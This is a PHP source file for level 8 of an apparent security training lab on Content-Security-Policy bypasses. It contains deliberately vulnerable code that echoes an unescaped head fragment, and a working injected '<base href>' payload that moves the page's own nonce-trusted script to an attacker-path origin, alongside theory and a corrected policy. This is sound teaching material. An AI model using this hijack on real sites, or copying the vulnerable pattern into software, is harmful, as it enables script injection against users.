<?php
require_once __DIR__ . '/helpers.php';

$L    = 8;
$meta = bp_levels()[$L];

// A properly random nonce, new on every response - as it should be. render.php
// generates its own the same way. Nothing in this level depends on knowing it.
$nonce  = bp_random_nonce();
$policy = bp_policy($L, $nonce);
$alt    = bp_alt_origin();

$payload = (string)($_POST['payload'] ?? '');
$flag    = '';
$result  = '';
$stages  = [];
$frame   = '';

if ($payload !== '') {
    $eval = csp_evaluate($policy, $payload, [
        'page_url'     => bp_render_url($L),
        'page_scripts' => [
            ['label' => "the page's own <script nonce src=\"app/widget.js\"> (relative path)",
             'kind'  => 'external', 'src' => 'app/widget.js', 'nonce' => $nonce],
        ],
    ]);
    $stages = csp_stages($eval);

    // The effect: the page's OWN nonce-bearing script now loads from an origin
    // that is not the page's. Nothing was injected into script position at all.
    $hijacked = null;
    foreach (csp_executed($eval, 'page') as $f) {
        if ($f['offorigin']) {
            $hijacked = $f;
            break;
        }
    }

    $frame = bp_frame($L, ['i' => $payload],
        'The fragment is written into the document head, above the widget script. Watch where the widget comes '
        . 'from: the frame reports it, and your browser network panel confirms it.');

    if ($hijacked !== null) {
        $flag   = bp_flag($L);
        $result = bp_verdict(true,
            'The page&rsquo;s own script now loads from <code>' . lk_esc($hijacked['origin']) . '</code>, an origin '
            . 'that appears nowhere in the policy. The nonce came along with the element and the browser accepted it.');
    } elseif ($eval['base']['injected'] !== null && !$eval['base']['honored']) {
        $result = bp_verdict(false,
            'The <code>&lt;base&gt;</code> was parsed but not honoured. Read the trace stage that explains why.');
    } elseif ($eval['base']['injected'] !== null) {
        $result = bp_verdict(false,
            'The base was honoured, but the widget still resolves to this page&rsquo;s own origin, so nothing has '
            . 'moved. Point the href at a host that is not this one.');
    } else {
        $result = bp_verdict(false,
            'Nothing in that markup changed where the page&rsquo;s scripts come from, and nothing in it runs on its '
            . 'own. The trace shows each decision.');
    }
}

$code = <<<'PHP'
// The nonce is generated correctly this time: 9 bytes from the CSPRNG,
// regenerated on every single response.
$nonce = bin2hex(random_bytes(9));

header("Content-Security-Policy: "
     . "default-src 'self'; "
     . "script-src 'nonce-$nonce'; "
     . "object-src 'none'");

// Theme fragment, written into <head> from the page's own settings.
echo '<head>';
echo '<script nonce="' . $nonce . '" src="frame.js"></script>';
echo $themeFragment;                      // <- the injection point
echo '</head>';

// The storefront widget, loaded by a relative path.
echo '<script nonce="' . $nonce . '" src="app/widget.js"></script>';
PHP;

$fixBad = <<<'PHP'
// script-src 'nonce-...'; object-src 'none'
// ... and no base-uri directive anywhere.
<script nonce="ab12cd" src="app/widget.js"></script>
PHP;

$fixGood = <<<'PHP'
// base-uri is not covered by default-src. If you do not name it, an
// injected <base> is honoured, and every relative URL below it moves.
header("Content-Security-Policy: "
     . "default-src 'self'; "
     . "script-src 'nonce-$nonce' 'strict-dynamic'; "
     . "object-src 'none'; "
     . "base-uri 'none'");        // or 'self' if the page needs a base

// Belt and braces: load your own scripts by absolute path, so a base
// element cannot move them even where the directive is missing.
echo '<script nonce="' . $nonce . '" src="https://shop.hackinlab.internal/app/widget.js"></script>';
PHP;

lk_page([
    'lab'        => bp_lab(),
    'level'      => $L,
    'title'      => $meta['title'],
    'difficulty' => $meta['difficulty'],
    'extra_head' => bp_extra_head(),

    'code'       => $code,
    'vuln_lines' => [7, 8, 13, 17],
    'annotation' => 'The nonce is generated correctly and is useless to you. The policy has no <code>base-uri</code>
        directive, and the page loads its own script by a relative path &mdash; so an injected <code>&lt;base&gt;</code>
        moves that script to a host you choose while its nonce stays valid.',

    'theory' => '<p>A nonce is an attribute of an element. It says "the server wrote this tag". It says nothing
        whatsoever about the URL in the tag&rsquo;s <code>src</code>, and the browser does not re-check the URL
        against a host list once a nonce has matched. That is by design &mdash; it is what makes nonces immune to
        the gadget problem from level 6.</p>
        <p><code>&lt;base href&gt;</code> changes how every relative URL in the document is resolved. Combine the
        two facts and the attack writes itself: you do not need to inject a script, you need to move the one that is
        already there. The nonce travels with the element, so the browser loads your host&rsquo;s copy and runs it
        with full trust.</p>
        <p>The reason this keeps happening is that <code>base-uri</code> does not fall back to <code>default-src</code>.
        A policy can look thorough &mdash; <code>default-src &#39;self&#39;</code>, a nonce, <code>object-src
        &#39;none&#39;</code> &mdash; and still have no opinion about the document base. The same is true of
        <code>form-action</code> and <code>frame-ancestors</code>, which is why the current guidance is to name all
        three explicitly. A minimal strict policy is
        <code>script-src &#39;nonce-…&#39; &#39;strict-dynamic&#39;; object-src &#39;none&#39;; base-uri &#39;none&#39;</code>,
        and the last directive is in that list because of exactly this attack.</p>',

    'fix' => [
        'bad'  => $fixBad,
        'good' => $fixGood,
        'note' => '<code>base-uri &#39;none&#39;</code> forbids the element entirely, which is what most applications
            want. Loading first-party scripts by absolute URL is a useful second layer, and it also removes a class
            of bugs where a page is served from more than one path depth.',
    ],

    'scenario' => '<strong>Scenario:</strong> the nonce generator was fixed after the last incident. It is now
        cryptographic and per-response, so reading it off a header no longer helps. The theme fragment is still
        written into the document head without escaping.
        <br><strong>Goal:</strong> get the frame to execute a script from an origin that is not its own.',

    'model' => [
        'title' => 'What the nonce does and does not cover',
        'html'  => '<table class="lk-kv">
            <tr><td>nonce covers</td><td>the <em>element</em>: this tag was written by the server</td></tr>
            <tr><td>nonce does not cover</td><td>the <em>URL</em>: once the nonce matches, the host is not checked</td></tr>
            <tr><td>base-uri missing</td><td>an injected <code>&lt;base href&gt;</code> is honoured</td></tr>
            <tr><td>relative src</td><td><code>app/widget.js</code> is resolved against whatever the base says</td></tr>
        </table>
        <p>You need a second origin your browser can reach. This lab is served from
        <code>' . lk_esc(bp_self_origin()) . '</code>, and the same server also answers on
        <code>' . lk_esc($alt) . '</code>. Those are different origins to a browser even though one machine answers
        both, and <code>' . lk_esc($alt) . '/attacker/app/widget.js</code> exists and calls <code>hlab.win()</code>.</p>
        <p>The policy this frame sends (the nonce changes on every response, which is the point):</p>
        <div class="bp-policy">' . lk_esc($policy) . '</div>',
    ],

    'form'   => bp_markup_form($payload, 'Theme fragment written into the document head',
        '<base href="' . $alt . '/attacker/">', 'Inject and render'),
    'result' => $result . $frame,
    'flag'   => $flag,
    'flag_msg' => 'The nonce was perfect. The document base was not defended.',
    'why'    => '<p>Look at the trace stage for the page&rsquo;s own widget script. Its <code>src</code> attribute
        never changed &mdash; it is still <code>app/widget.js</code> &mdash; but the URL it resolves to did, because
        you changed the document base above it. The nonce on that element still matched, so CSP allowed the load.</p>
        <p>This is worth sitting with, because it inverts the usual mental model. You did not inject a script. You
        injected a <em>resolution rule</em>, and the page&rsquo;s own trusted tag did the rest. Payload-shaped
        thinking would never find this; reading the policy for missing directives finds it immediately.</p>
        <p>Practical check when you review a policy: list the directives that do not inherit from
        <code>default-src</code> &mdash; <code>base-uri</code>, <code>form-action</code>,
        <code>frame-ancestors</code>, <code>sandbox</code>, <code>report-to</code> &mdash; and confirm each one is
        either present or deliberately omitted.</p>',

    'pipeline' => $stages,
    'probes'   => [
        'param'  => 'payload',
        'method' => 'POST',
        'action' => 'level8.php',
        'items'  => [
            ['q'       => 'Is the nonce guessable this time?',
             'payload' => '<script nonce="deadbeef">hlab.win()</script>',
             'learn'   => 'A refusal, and a different value on every reload of this page, tell you the generator was '
                        . 'fixed. That closes the level-7 route and points you at the policy&rsquo;s gaps instead.'],
            ['q'       => 'Is a base element even allowed to take effect?',
             'payload' => '<base href="/attacker/">',
             'learn'   => 'A same-origin base. It moves the widget URL without leaving this origin, so nothing '
                        . 'dangerous happens &mdash; but the trace shows whether the element was honoured, which is '
                        . 'the fact you actually need.'],
            ['q'       => 'Does the widget script really use a relative path?',
             'payload' => '<base href="/">',
             'learn'   => 'If the resolved URL in the trace changes, the path is relative and moveable. If it does '
                        . 'not, the page uses absolute URLs and this route is closed.'],
        ],
    ],
    'hints' => bp_hints($L),
]);
